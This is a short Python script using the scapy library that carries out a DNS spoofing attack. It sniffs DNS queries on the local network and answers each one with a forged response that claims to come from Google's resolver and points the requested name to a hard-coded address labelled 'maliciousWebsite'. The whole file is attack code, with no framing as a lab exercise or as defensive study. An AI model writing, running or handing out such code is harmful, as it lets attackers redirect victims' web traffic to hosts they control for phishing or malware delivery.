import scapy.all as sc
maliciousWebsite = "131.155.10.135"

def spoof_dns_response(target_ip, transaction_id, qname):
    ip = sc.IP(dst=target_ip, src="8.8.8.8")  # Pretend to be Google DNS
    udp = sc.UDP(dport=sc.RandShort(), sport=53)
    dns = sc.DNS(
        id=transaction_id,
        qr=1,
        aa=1,
        qd=sc.DNSQR(qname=qname),
        an=sc.DNSRR(rrname=qname, ttl=60, rdata=maliciousWebsite)
    )
    pkt = ip / udp / dns
    sc.send(pkt)
    print(f"[+] Spoofed DNS response sent for {qname}")



def dns_sniffer(packet):
    if packet.haslayer(sc.DNS) and packet.getlayer(sc.DNS).qr == 0:
        qname = packet[sc.DNSQR].qname.decode()
        transaction_id = packet[sc.DNS].id
        src_ip = packet[sc.IP].src
        spoof_dns_response(src_ip, transaction_id, qname)

sc.sniff(filter="udp port 53", prn=dns_sniffer)